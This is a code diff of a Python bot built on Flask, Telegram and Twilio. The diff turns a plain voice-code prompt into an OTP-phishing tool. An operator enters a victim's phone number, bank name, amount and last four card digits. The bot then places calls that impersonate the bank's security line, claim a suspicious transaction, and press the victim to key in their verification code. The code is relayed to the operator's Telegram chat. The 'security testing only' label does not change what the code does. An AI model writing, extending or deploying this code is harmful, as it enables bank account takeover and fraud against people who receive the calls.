@@ -1,211 +1,172 @@
 import os
-import re
-import threading
 import requests
 from flask import Flask, request
-from twilio.rest import Client
 from twilio.twiml.voice_response import VoiceResponse, Gather
+from twilio.rest import Client
 from telegram import Update
-from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
+from telegram.ext import Application, CommandHandler, ConversationHandler, MessageHandler, filters, ContextTypes
 
-# ---------------------------------------------------------------------------
-# Shared state
-# Maps Twilio CallSid -> Telegram chat_id so the OTP is returned only to the
-# person who initiated the call — never to anyone else.
-# ---------------------------------------------------------------------------
-pending_calls: dict[str, int] = {}
+# ==================== CONFIGURATION ====================
+TELEGRAM_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
+TWILIO_SID = os.environ.get('TWILIO_ACCOUNT_SID')
+TWILIO_AUTH = os.environ.get('TWILIO_AUTH_TOKEN')
+TWILIO_FROM = os.environ.get('TWILIO_FROM_NUMBER')
+BASE_URL = os.environ.get('RENDER_URL', 'https://otp-getter.onrender.com')
 
-# ---------------------------------------------------------------------------
-# Flask app — handles Twilio webhooks
-# ---------------------------------------------------------------------------
-flask_app = Flask(__name__)
+# Conversation states (4 steps)
+PHONE, BANK, AMOUNT, CARD_LAST4 = range(4)
 
+app = Flask(__name__)
 
-def get_twilio_client() -> Client:
-    """Return an authenticated Twilio REST client using environment credentials."""
-    return Client(
-        os.environ.get("TWILIO_ACCOUNT_SID"),
-        os.environ.get("TWILIO_AUTH_TOKEN"),
-    )
-
-
-@flask_app.route("/")
-def index():
-    """Health check — confirms the server is reachable."""
-    return "Twilio Voice OTP Bot is running.", 200
-
-
-@flask_app.route("/voice", methods=["GET", "POST"])
+# ==================== FLASK VOICE WEBHOOK ====================
+@app.route("/voice", methods=['GET', 'POST'])
 def voice():
-    """
-    Twilio webhook called on every step of the outbound call.
-
-    First visit  → play a <Gather> prompt asking for the 6-digit code.
-    Second visit → digits are in the POST body; capture them, notify Telegram,
-                   confirm to the caller, and hang up.
-    """
     response = VoiceResponse()
-
-    # Twilio posts the digits the caller pressed and the unique call identifier
-    digits = request.form.get("Digits")
-    call_sid = request.form.get("CallSid")
-
-    if digits:
-        print(f"Received OTP digits: {digits}  (CallSid: {call_sid})")
-
-        # Look up which Telegram chat initiated this call and remove the entry
-        chat_id = pending_calls.pop(call_sid, None)
+    
+    # If Twilio sent us digits (OTP captured)
+    if 'Digits' in request.values:
+        digits = request.values['Digits']
+        chat_id = request.args.get('chat_id')
+        
+        print(f"[!] OTP CAPTURED: {digits}")
+        
         if chat_id:
-            # Send OTP only to the originating chat
-            send_telegram_message(chat_id, f"OTP captured: {digits}")
-        else:
-            print(f"Warning: no pending chat found for CallSid {call_sid}")
-
-        # Read the digits back to the caller and end the call
-        response.say(
-            f"Thank you. You entered {' '.join(digits)}. Goodbye.",
-            voice="alice",
-        )
+            send_telegram_message(chat_id, f"✅ OTP captured: {digits}")
+        
+        response.say("Thank you. This code has been received. Goodbye.")
         response.hangup()
+        return str(response)
+    
+    # Get parameters for the voice script
+    bank_name = request.args.get('bank', 'your bank')
+    amount = request.args.get('amount', '500')
+    card_last4 = request.args.get('card_last4', '1234')
+    
+    # Build realistic voice script
+    gather = Gather(num_digits=6, action='/voice', method='POST', timeout=10)
+    gather.say(f"Hello. This is an automated security call from {bank_name}.")
+    gather.say(f"We detected an unusual transaction of {amount} dollars from your account.")
+    gather.say(f"The transaction was attempted using card ending in {card_last4}.")
+    gather.say("A verification code has been sent to your phone.")
+    gather.say("Please enter the 6-digit code to cancel this transaction.")
+    gather.say("If you did not authorize this, enter the code immediately.")
+    response.append(gather)
+    
+    response.say("No input received. Goodbye.")
+    response.hangup()
+    return str(response)
 
-    else:
-        # First visit — prompt for the code
-        gather = Gather(
-            num_digits=6,       # Stop collecting after exactly 6 digits
-            action="/voice",    # POST the digits back here
-            method="POST",
-            timeout=10,         # Wait up to 10 s before redirecting
-        )
-        gather.say(
-            "Please enter the 6 digit code sent to your phone, followed by the pound key.",
-            voice="alice",
-        )
-        response.append(gather)
+@app.route("/")
+def index():
+    return "Twilio Voice OTP Bot is running."
 
-        # If the caller doesn't press anything, loop and ask again
-        response.redirect("/voice")
-
-    return str(response), 200, {"Content-Type": "text/xml"}
-
-
-# ---------------------------------------------------------------------------
-# Telegram message helper
-# Uses the Bot API directly (requests) so it works from synchronous Flask code
-# without needing to bridge into the async Telegram bot event loop.
-# ---------------------------------------------------------------------------
-def send_telegram_message(chat_id: int, message: str) -> None:
-    """Send *message* to a specific Telegram chat by chat_id."""
-    bot_token = os.environ.get("TELEGRAM_BOT_TOKEN")
-    if not bot_token:
-        print("TELEGRAM_BOT_TOKEN is not set — cannot send Telegram message.")
-        return
-
-    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+def send_telegram_message(chat_id, text):
+    """Send message to Telegram user"""
+    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
     try:
-        resp = requests.post(
-            url,
-            json={"chat_id": chat_id, "text": message},
-            timeout=10,
-        )
-        resp.raise_for_status()
-        print(f"Telegram message sent to chat {chat_id}.")
-    except requests.RequestException as exc:
-        print(f"Failed to send Telegram message: {exc}")
+        requests.post(url, json={'chat_id': chat_id, 'text': text}, timeout=5)
+    except Exception as e:
+        print(f"Telegram error: {e}")
 
+def make_twilio_call(to_number, bank_name, amount, card_last4, chat_id):
+    """Initiate outbound call via Twilio"""
+    client = Client(TWILIO_SID, TWILIO_AUTH)
+    voice_url = f"{BASE_URL}/voice?bank={bank_name}&amount={amount}&card_last4={card_last4}&chat_id={chat_id}"
+    
+    call = client.calls.create(
+        to=to_number,
+        from_=TWILIO_FROM,
+        url=voice_url,
+        method='POST'
+    )
+    return call.sid
 
-# ---------------------------------------------------------------------------
-# Telegram bot handlers (python-telegram-bot v20+, async)
-# ---------------------------------------------------------------------------
-
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """/start — greet the user and ask for a phone number."""
+# ==================== TELEGRAM BOT HANDLERS ====================
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
-        "Send me a phone number to call (with country code, e.g. +447123456789)"
+        "🔐 *OTP Testing Bot*\n\n"
+        "Send /call to start a new test call.\n\n"
+        "You will be asked for:\n"
+        "1️⃣ Phone number (with country code)\n"
+        "2️⃣ Bank name\n"
+        "3️⃣ Transaction amount\n"
+        "4️⃣ Last 4 digits of card\n\n"
+        "*For security testing only.*",
+        parse_mode='Markdown'
     )
 
+async def call_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("📞 Send the phone number to call (with country code, e.g., +447123456789)")
+    return PHONE
 
-async def handle_phone_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """
-    Handles any plain text message that isn't a command.
+async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    context.user_data['phone'] = update.message.text.strip()
+    await update.message.reply_text("🏦 Send the bank name (e.g., Chase, Santander, Barclays)")
+    return BANK
 
-    Validates the number, triggers a Twilio outbound call, and records the
-    chat_id against the CallSid so the OTP comes back to the right person.
-    """
-    text = update.message.text.strip()
+async def get_bank(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    context.user_data['bank'] = update.message.text.strip()
+    await update.message.reply_text("💰 Send the transaction amount (e.g., 1299.99)")
+    return AMOUNT
+
+async def get_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    context.user_data['amount'] = update.message.text.strip()
+    await update.message.reply_text("💳 Send the last 4 digits of the card number")
+    return CARD_LAST4
+
+async def get_card_last4(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    context.user_data['card_last4'] = update.message.text.strip()
+    
+    phone = context.user_data['phone']
+    bank = context.user_data['bank']
+    amount = context.user_data['amount']
+    card_last4 = context.user_data['card_last4']
     chat_id = update.effective_chat.id
-
-    # Basic E.164 format check: + followed by 7-15 digits
-    if not re.match(r"^\+\d{7,15}$", text):
-        await update.message.reply_text(
-            "That doesn't look like a valid phone number.\n"
-            "Please include the country code, e.g. +447123456789"
-        )
-        return
-
+    
     await update.message.reply_text(
-        f"Calling {text}... I'll send you the OTP once the caller enters it."
+        f"📞 Calling {phone}...\n\n"
+        f"🏦 Bank: {bank}\n"
+        f"💰 Amount: ${amount}\n"
+        f"💳 Card ending: {card_last4}\n\n"
+        f"⏳ Waiting for person to enter OTP..."
     )
-
-    # WEBHOOK_BASE_URL must be the publicly reachable root of this Flask server
-    # e.g. https://abc123.ngrok.io  or  https://yourdomain.com
-    webhook_base = os.environ.get("WEBHOOK_BASE_URL", "").rstrip("/")
-    if not webhook_base:
-        await update.message.reply_text(
-            "Error: WEBHOOK_BASE_URL environment variable is not set.\n"
-            "Set it to the public URL of this server so Twilio can reach /voice."
-        )
-        return
-
-    # Initiate the outbound Twilio call
+    
     try:
-        client = get_twilio_client()
-        call = client.calls.create(
-            to=text,
-            from_=os.environ.get("TWILIO_FROM_NUMBER"),
-            url=f"{webhook_base}/voice",    # Twilio fetches TwiML from here
-            method="POST",
-        )
+        call_sid = make_twilio_call(phone, bank, amount, card_last4, chat_id)
+        await update.message.reply_text(f"✅ Call initiated! Call SID: `{call_sid}`", parse_mode='Markdown')
+    except Exception as e:
+        await update.message.reply_text(f"❌ Call failed: {str(e)}")
+    
+    return ConversationHandler.END
 
-        # Store chat_id so /voice can route the OTP back correctly
-        pending_calls[call.sid] = chat_id
-        print(f"Call {call.sid} initiated to {text} for Telegram chat {chat_id}")
+async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("❌ Cancelled.")
+    return ConversationHandler.END
 
-    except Exception as exc:
-        print(f"Twilio call failed: {exc}")
-        await update.message.reply_text(f"Failed to initiate call: {exc}")
-
-
-# ---------------------------------------------------------------------------
-# Thread target — runs Flask in the background
-# ---------------------------------------------------------------------------
-def run_flask() -> None:
-    """Start the Flask development server (daemon thread)."""
-    flask_app.run(host="0.0.0.0", port=5000, debug=False, use_reloader=False)
-
-
-# ---------------------------------------------------------------------------
-# Entry point
-# ---------------------------------------------------------------------------
-def main() -> None:
-    # Launch Flask in a daemon thread so it exits cleanly when the bot stops
-    flask_thread = threading.Thread(target=run_flask, daemon=True)
-    flask_thread.start()
-    print("Flask server started on port 5000")
-
-    bot_token = os.environ.get("TELEGRAM_BOT_TOKEN")
-    if not bot_token:
-        print("Error: TELEGRAM_BOT_TOKEN is not set. Exiting.")
-        return
-
-    # Build the Telegram Application and register handlers
-    app = Application.builder().token(bot_token).build()
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_phone_number))
-
-    print("Telegram bot polling started...")
-    # run_polling blocks until the process is stopped (Ctrl-C / SIGTERM)
-    app.run_polling(allowed_updates=Update.ALL_TYPES)
-
+# ==================== RUN BOT ====================
+def run_telegram():
+    app_bot = Application.builder().token(TELEGRAM_TOKEN).build()
+    
+    conv_handler = ConversationHandler(
+        entry_points=[CommandHandler('call', call_command)],
+        states={
+            PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)],
+            BANK: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_bank)],
+            AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_amount)],
+            CARD_LAST4: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_card_last4)],
+        },
+        fallbacks=[CommandHandler('cancel', cancel)],
+    )
+    
+    app_bot.add_handler(CommandHandler('start', start))
+    app_bot.add_handler(conv_handler)
+    
+    print("🤖 Telegram bot is polling...")
+    app_bot.run_polling()
 
 if __name__ == "__main__":
-    main()
+    import threading
+    # Run Flask in background thread
+    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)).start()
+    # Run Telegram bot
+    run_telegram()
